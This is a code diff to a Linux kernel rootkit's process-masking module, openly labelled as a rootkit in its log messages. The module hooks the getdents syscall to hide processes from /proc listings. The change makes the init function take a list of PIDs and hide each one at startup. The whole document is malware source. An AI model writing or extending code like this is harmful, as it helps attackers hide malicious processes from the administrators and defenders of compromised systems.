@@ -63,7 +63,7 @@ static struct list_head masked_processes;
 
 
 /* Declaration of functions */
-int process_masking_init(int);
+int process_masking_init(int, pid_t *, int);
 int process_masking_exit(void);
 
 asmlinkage int process_masking_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int, int);
@@ -84,8 +84,10 @@ static void delete_masked_processes(void);
 
 
 /* Initialization function */
-int process_masking_init(int debug_mode_on)
+int process_masking_init(int debug_mode_on, pid_t *pids, int pids_count)
 {
+	int i;
+
 	show_debug_messages = debug_mode_on;
 
 	proc_ino = get_inode_no("/proc");
@@ -97,6 +99,9 @@ int process_masking_init(int debug_mode_on)
 	register_callback(__NR_getdents, (void *) process_masking_getdents_syscall);
 
 	DEBUG_PRINT("initialized");
+
+	for (i=0 ; i<pids_count ; i++)
+		mask_process(pids[i]);
 
 	return 0;
 }
@@ -162,7 +167,7 @@ int mask_process(pid_t pid)
 
 	list_add(&new->list, &masked_processes);
 
-	printk(KERN_INFO "rootkit process_masking: process_is_masked - %d\n", process_is_masked(pid));
+	printk(KERN_INFO "rootkit process_masking: masking process with PID %d\n", pid);
 
 	return 0;
 }
